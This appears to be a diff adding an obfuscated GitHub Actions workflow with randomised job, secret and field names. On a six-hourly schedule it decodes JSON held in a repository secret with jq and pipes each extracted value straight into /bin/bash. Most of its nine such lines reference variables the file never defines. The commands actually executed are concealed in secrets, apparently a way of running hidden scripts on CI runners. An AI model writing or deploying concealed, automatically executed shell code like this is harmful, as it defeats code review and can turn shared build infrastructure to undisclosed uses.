@@ -1,0 +1,27 @@
+name: lingzhudaregc
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '30 4/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: lingzhudaregc
+        env:
+          tvy592: ${{ secrets.tvy592 }}
+        run: |
+          echo $tvy592 | jq -r .jyt199 | /bin/bash
+          echo $d179 | jq -r .eckb3255 | /bin/bash
+          echo $u0 | jq -r .imu87261 | /bin/bash
+          echo $zrq3 | jq -r .uba463 | /bin/bash
+          echo $cylfr57756 | jq -r .muow1 | /bin/bash
+          echo $vfs676 | jq -r .wiws14 | /bin/bash
+          echo $rqsih06639 | jq -r .zjf06 | /bin/bash
+          echo $oxg0 | jq -r .irliz19651 | /bin/bash
+          echo $dkjfw17 | jq -r .d387 | /bin/bash
+
